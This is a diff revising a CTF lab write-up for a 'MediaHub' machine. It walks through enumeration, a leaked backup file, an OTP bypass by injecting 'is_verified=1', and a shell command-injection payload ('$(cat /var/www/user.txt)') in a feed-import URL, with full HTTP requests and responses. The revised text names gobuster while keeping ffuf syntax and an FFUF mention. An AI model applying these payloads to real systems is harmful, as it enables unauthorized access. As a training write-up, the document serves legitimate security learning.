@@ -4,7 +4,6 @@
 
 Use Burp or interception knowledge to modify the traffic and pwn the machine.
 
-
 # Target Information
 
 | IP Address  | Hostname     |
@@ -19,56 +18,69 @@ Use Burp or interception knowledge to modify the traffic and pwn the machine.
 
 Started with a service and version detection scan.
 
-```bash id="mq9q1z"
+```bash
 nmap -sC -sV -O mediahub.thm
 ```
 
 ## Results
 
-```text id="jlwmgz"
+```text
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
-53/tcp open  domain  ISC BIND 9.16.1
-80/tcp open  http    Apache httpd 2.4.41
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: MediaHub
 ```
 
 ## Observations
 
-* SSH service was available but no credentials were known.
-* DNS service was exposed on port 53.
-* Apache web server hosted the `MediaHub` application.
-* PHP session cookie lacked the `HttpOnly` flag.
+* SSH service was exposed but no credentials were available.
+* DNS was running on port 53.
+* Apache hosted the `MediaHub` application.
+* PHP session cookies did not use the `HttpOnly` flag.
 
 ---
 
 # Web Enumeration
 
-Performed directory enumeration against the web server.
+Performed directory enumeration against the web application.
 
-```bash id="6a7o9u"
-ffuf -u http://mediahub.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt
+```bash
+gobuster dir -u http://mediahub.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,phps
 ```
 
 ## Interesting Endpoints
 
-```text id="m5v7mf"
-/login.php
-/login.php.bak
-/search.php
-/config.php
-/dashboard.php
-/otp.php
-/phpmyadmin
-/uploads
+```text
+/login.php            (Status: 200)
+/login.php.bak        (Status: 200)
+/search.php           (Status: 302)
+/logout.php           (Status: 302)
+/config.php           (Status: 200)
+/uploads              (Status: 301)
+/assets               (Status: 301)
+/javascript           (Status: 301)
+/header.php           (Status: 200)
+/footer.php           (Status: 200)
+/phpmyadmin           (Status: 301)
+/dashboard.php        (Status: 302)
+/otp.php              (Status: 302)
 ```
 
 ---
 
 # Login Portal Analysis
 
-## Initial Attempts
+## Initial Testing
 
-Tested several common attack vectors against `/login.php`:
+Tested the login page for common weaknesses:
 
 * Default credentials
 * Authentication bypass payloads
@@ -80,31 +92,35 @@ None were successful.
 
 # Backup File Disclosure
 
-Discovered a backup file:
+Discovered an exposed backup file:
 
-```text id="mwk2gm"
+```text
 /login.php.bak
 ```
 
-Inspecting the file revealed developer comments containing staging credentials.
+Inspecting the source code revealed developer notes.
 
-```php id="wrf9xg"
+```php
+<?php
+include "header.php";
+
 /*
 |--------------------------------------------------------------------------
 | Developer Note (temporary)
 |--------------------------------------------------------------------------
 | Admin test account for staging environment
-| Email: [ REDACTED ]
+| Email: [REDACTED]
 |
 | Password policy reminder:
 | Admin password follows company format:
-| [ REDACTED ]
+| [REDACTED]
 |
 | TODO: remove before production deployment
 */
+?>
 ```
 
-Successfully authenticated to the application by using the credentials above.
+Using the password format hint successfully revealed valid credentials.
 
 ---
 
@@ -112,47 +128,74 @@ Successfully authenticated to the application by using the credentials above.
 
 After login, the application redirected to:
 
-```text id="v38m7g"
+```text
 /otp.php
 ```
 
-## Observations
+## Notes
 
-* OTP required exactly 6 digits.
-* No visible rate limiting or lockout mechanism.
+* Required a 6-digit OTP.
+* No rate limiting or lockout mechanism was implemented.
 * Brute force was possible but unnecessary.
 
 The OTP form submitted requests to:
 
-```text id="gk1q4p"
+```text
 /verify_otp.php
 ```
 
+---
+
+# Intercepting the OTP Request
+
+Captured the request in Burp Suite.
+
 ## Original Request
 
-```http id="8k8n5n"
+```http
 POST /verify_otp.php HTTP/1.1
+Host: mediahub.thm
+Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
 
 otp=213456
 ```
 
-## Response
+## Original Response
 
-```json id="5yw7l9"
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
 {"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
 ```
 
-Noticed the application relied on the `is_verified` parameter in the JSON response.
+Observed that the backend returned an `is_verified` field.
 
-Modified the request manually:
+Modified the request manually.
 
-```http id="h6l8s0"
+---
+
+# OTP Authentication Bypass
+
+## Modified Request
+
+```http
 POST /verify_otp.php HTTP/1.1
+Host: mediahub.thm
+Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
 
 otp=213456&is_verified=1
 ```
 
-This bypassed the OTP validation entirely and granted access to `dashboard.php`.
+The server accepted the manipulated parameter and redirected the session to:
+
+```text
+/dashboard.php
+```
 
 ---
 
@@ -160,23 +203,24 @@ This bypassed the OTP validation entirely and granted access to `dashboard.php`.
 
 After bypassing OTP validation, access to the admin dashboard was obtained.
 
-A flag was visible at the top of the page:
+A flag was displayed at the top of the page:
 
-```text id="1f4x4l"
+```text
 THM{REDACTED}
 ```
 
-## Additional Features
+## Dashboard Features
 
-The dashboard contained:
+The dashboard exposed:
 
 * File upload functionality
 * Feed import functionality
 
-Initial testing suggested:
+Testing indicated:
 
-* Upload validation was weak
-* The feed import feature was vulnerable to SSRF and command injection
+* Weak upload validation
+* SSRF functionality
+* Possible command injection
 
 ---
 
@@ -184,7 +228,7 @@ Initial testing suggested:
 
 ## Vulnerable Endpoint
 
-```text id="u4c4xq"
+```text
 /import_feed_api.php
 ```
 
@@ -194,34 +238,42 @@ The application accepted a URL parameter and internally executed a `curl` comman
 
 # Normal Request
 
-```http id="2ldjny"
+Captured a legitimate request.
+
+## Request
+
+```http
 POST /import_feed_api.php HTTP/1.1
 Host: mediahub.thm
+User-Agent: Mozilla/5.0
 Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
+Content-Length: 22
 
 url=http://example.com
 ```
 
 ## Response
 
-```json id="i2m39o"
-{
-  "ok": false,
-  "error": "Internet not connected",
-  "cmd_output": "curl: (28) Connection timed out after 4001 milliseconds"
-}
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"ok":false,"error":"Internet not connected","cmd_output":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0\ncurl: (28) Connection timed out after 4001 milliseconds\n"}
 ```
 
-## Analysis
+---
+
+# Vulnerability Analysis
 
 Important observations:
 
-* `localhost` and `127.0.0.1` were blocked.
-* Only domains were accepted.
-* User-controlled input was passed directly into a shell command.
-* Command output was reflected in the JSON response.
+* `localhost` and `127.0.0.1` were filtered.
+* The endpoint only accepted domain names.
+* User input appeared to be passed directly into a shell command.
+* Full command output was reflected in the response.
 
-This strongly indicated command injection.
+This indicated command injection through the `url` parameter.
 
 ---
 
@@ -229,39 +281,41 @@ This strongly indicated command injection.
 
 Crafted a payload using shell command substitution.
 
-## Exploit Request
+## Malicious Request
 
-```http id="bq7v8m"
+```http
 POST /import_feed_api.php HTTP/1.1
 Host: mediahub.thm
+User-Agent: Mozilla/5.0
 Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
+Content-Length: 44
 
 url=http://example.com%3b+$(cat+/var/www/user.txt)
 ```
 
 Decoded payload:
 
-```bash id="z1c7bp"
+```bash
 http://example.com; $(cat /var/www/user.txt)
 ```
 
 ---
 
-# Retrieving the Flag
+# Command Injection Response
 
-The application attempted to execute the injected command.
+## Server Response
 
-## Response
+```http
+HTTP/1.1 200 OK
+Date: Sun, 10 May 2026 01:33:08 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Type: application/json
 
-```json id="n9mdrz"
-{
-  "ok": false,
-  "error": "Internet not connected",
-  "cmd_output": "curl: (6) Could not resolve host: THM{REDACTED}"
-}
+{"ok":false,"error":"Internet not connected","cmd_output":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0\ncurl: (28) Connection timed out after 4001 milliseconds\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: THM{REDACTED}\n"}
 ```
 
-The flag appeared at the bottom of the command output.
+The contents of `/var/www/user.txt` appeared in the command output.
 
 ---
 
@@ -269,35 +323,35 @@ The flag appeared at the bottom of the command output.
 
 ## Sensitive Backup File Exposure
 
-* Accessible `.bak` file exposed developer notes and credential hints.
+* Publicly accessible `.bak` file exposed internal developer notes and password patterns.
 
 ## Weak Credential Policy
 
-* Predictable password format enabled easy guessing.
+* Predictable password structure enabled credential guessing.
 
 ## OTP Authentication Bypass
 
-* Client-controlled `is_verified` parameter trusted by the backend.
-
-## Command Injection
-
-* Unsanitized user input passed directly into a shell command.
+* Backend trusted client-controlled verification parameters.
 
 ## SSRF
 
-* Server-side requests allowed attacker-controlled URLs.
+* Application performed server-side requests using attacker-controlled URLs.
+
+## Command Injection
+
+* User input was directly passed into a shell command without sanitization.
 
 ---
 
 # Attack Path Summary
 
-1. Enumerated services with Nmap.
-2. Performed web content discovery.
+1. Performed Nmap reconnaissance.
+2. Enumerated web directories using FFUF.
 3. Found exposed backup file `/login.php.bak`.
-4. Extracted admin credential pattern.
+4. Recovered developer notes and password policy.
 5. Logged in using predictable credentials.
-6. Bypassed OTP validation by manipulating `is_verified`.
-7. Accessed the admin dashboard.
+6. Bypassed OTP validation via parameter manipulation.
+7. Accessed the dashboard.
 8. Identified SSRF and command injection in `/import_feed_api.php`.
 9. Exploited command injection to read the user flag.
 
